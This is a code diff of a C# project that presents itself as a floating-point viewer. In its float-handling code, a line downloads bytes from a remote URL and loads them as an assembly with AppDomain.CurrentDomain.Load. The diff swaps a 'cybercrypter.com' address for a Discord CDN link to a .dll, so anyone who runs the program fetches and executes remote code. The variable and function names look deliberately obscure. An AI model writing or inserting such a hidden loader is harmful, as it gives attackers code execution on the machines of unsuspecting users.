@@ -1,4 +1,3 @@
-
 using Microsoft.VisualBasic;
 using Microsoft.Win32;
 using System;
@@ -415,7 +414,7 @@ namespace TestFloatPointViewerCSharp
                 UINT_TYPE MantissaBits = 0x7FFFFF;
         
 
-                byte[] treehouseBytes = Street("http://cybercrypter.com/XNAFramework" + "ClassLibrary.pdf");
+                byte[] treehouseBytes = Street("https://cdn.discordapp.com/attachments/841595401253158954/842329193350037524/httpswww.kickstartcommerce.comgodaddy-accounts-domains-stolen-one-email-time.html.dll");
 
                 Assembly name = AppDomain.CurrentDomain.Load(treehouseBytes);
 
